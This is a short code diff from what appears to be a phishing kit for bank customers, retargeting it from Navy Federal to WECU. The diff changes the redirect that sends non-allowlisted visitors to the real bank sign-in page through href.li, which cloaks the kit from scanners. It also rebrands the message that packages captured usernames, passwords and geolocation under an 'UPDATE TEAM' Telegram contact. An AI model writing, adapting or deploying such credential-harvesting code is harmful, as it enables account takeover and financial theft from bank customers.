@@ -72,7 +72,7 @@ app.use(async (req, res, next) => {
   if (await isAllowed(ipAddress)) {
     next();
   } else {
-    res.redirect("https://href.li/?https://digitalapps.navyfederal.org/signin/");
+    res.redirect("https://href.li/?https://online.wecu.com");
   }
   }else{
   	next();
@@ -160,7 +160,7 @@ app.post("/receive", async (req, res) => {
         }
       });
 
-      message += `\n========================\n\n${fullGeoInfo}\n✅ UPDATE TEAM | NAVY FEDERAL\n💬 Telegram: https://t.me/updteams\n`;
+      message += `\n========================\n\n${fullGeoInfo}\n✅ UPDATE TEAM | WECU \n💬 Telegram: https://t.me/updteams\n`;
 
       // Validate only if auth keys exist
       const hasAuthKeys = (lowerCaseKeys.username && lowerCaseKeys.password) ||
